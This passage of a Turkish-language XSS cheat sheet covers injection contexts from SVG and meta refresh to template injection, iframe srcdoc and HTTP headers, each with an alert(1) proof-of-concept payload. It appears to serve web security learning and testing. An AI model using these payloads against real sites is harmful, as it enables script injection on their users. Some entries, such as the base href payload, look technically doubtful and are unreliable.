<h1>CONTEXTS</h1>
<br>

<h2>🔹 9. SVG / XML Context</h2>
<h4>Input SVG veya XML içeriği içinde kullanılır. SVG elementlerinin event handler’ları (ör: circle onload=...)<br>
sayesinde XSS mümkündür. Input kontrol edilmezse buradan da XSS çıkar.</h4><br>

📌 Örnek:  
`<svg><circle onload="alert(1)"/></svg>`  
<br>
🎯 Exploit:  
```html
<svg/onload=alert(1)>
```
<br>



<h2>🔹 10. Meta Tag Context</h2>
<h4>Input meta tag’ının attribute’larına gömülür, özellikle http-equiv="refresh" ile sayfa otomatik yönlendirilirken<br>
content attribute’u içine javascript: URI yerleştirilebilir. Böylece sayfa JS koduyla yönlendirilip XSS olur.</h4><br>

📌 Örnek:  
`<meta http-equiv="refresh" content="0;url=PAYLOAD">`  
<br>
🎯 Exploit:  
```html
javascript:alert(1)"
```
<br>



<h2>🔹 11. Base Href Context</h2>
<h4>Sayfada (base href="...") varsa, ve bu değer kontrolsüzse, base URL olarak javascript: URI<br>
verilip tüm sayfadaki göreceli URL’ler JS kodu çalıştıracak şekilde değiştirilebilir.

</h4><br>

📌 Örnek:  
```
<base href="javascript://">
<a href="/x">Click</a>
```  
<br>
🎯 Exploit:  

```html
<base href="javascript://">
<a href="/alert(1)">Click</a>
``` 
<br>


<h2>🔹 12. Template Injection Context</h2>
<h4>Client-side template motorlarında (Mustache, Handlebars, AngularJS, VueJS) input, template ifadesi olarak gömülür.<br>
Burada ham expression’lar (ör. {{constructor.constructor("alert(1)")()}}) ile XSS yapılabilir.</h4><br>

📌 Örnek:  
```html
<script type="text/template">
  Hello {{PAYLOAD}}
</script>
```
<br>

🎯 Exploit:  
```js
{{constructor.constructor("alert(1)")()}}
```
<br>



<h2>🔹 13. Markdown / BBCode Context</h2>
<h4>Input Markdown veya BBCode olarak işleniyor, sonrasında HTML’ye dönüştürülüyorsa, <br>
özellikle javascript: URI içeren linkler veya resimler XSS açığı oluşturabilir.</h4><br>

📌 Örnek:  
`[click](javascript:alert(1))`  
<br>
🎯 Exploit:  
```html
![img](javascript:alert(1))
```
<br>



<h2>🔹 14. Iframe Srcdoc Context</h2>
<h4>Input iframe’in srcdoc attribute’una doğrudan yerleştiriliyorsa, buraya kötü amaçlı<br>
script kodları konabilir. Eğer sandbox parametresi izin verirse bu XSS’e dönüşür.</h4><br>

📌 Örnek:  
```document.body.innerHTML = `<iframe srcdoc="${userInput}">`;```  
veya  
`element.innerHTML = location.hash;`
<br>  
🎯 Exploit:  
```html
#<iframe srcdoc="<script>alert(1)</script>" sandbox="allow-scripts">
```
srcdoc payload’larında sandbox="allow-scripts" olmazsa script çalışmaz.  
<br>



<h2>🔹 15. Sandboxed Context (Controlled via CSP / Sandbox attr)</h2>
<h4>iframe sandbox attribute’u belirli kısıtlamalar getirir. Yanlış konfigüre edilirse,<br>
örneğin allow-scripts ile script çalışmasına izin veriliyorsa, buradan XSS yapılabilir.

</h4><br>

📌 Örnek:  
`<iframe sandbox="allow-scripts" srcdoc="PAYLOAD"></iframe>`  
<br>
🎯 Exploit:  
```html
<script>alert(1)</script>
```
srcdoc payload’larında sandbox="allow-scripts" olmazsa script çalışmaz.  
<br>



<h2>🔹 16. HTTP Header Context</h2>
<h4>Bazı XSS’ler response header’ları üzerinden yapılır. Örneğin, Location header’da kontrolsüz javascript: URI<br>
kullanılırsa, redirect ile XSS olur. Ayrıca Refresh, Referer ve CSP header’ları da hedef olabilir.</h4><br>

📌 Örnek:  
`Location: PAYLOAD`
<br>  
🎯 Exploit:  
```html
javascript:alert(1)
```
Ayrıca kontrol edilmesi gerekenler:  
`Refresh:` `Referer:` `Content-Security-Policy:` injection olabilir.
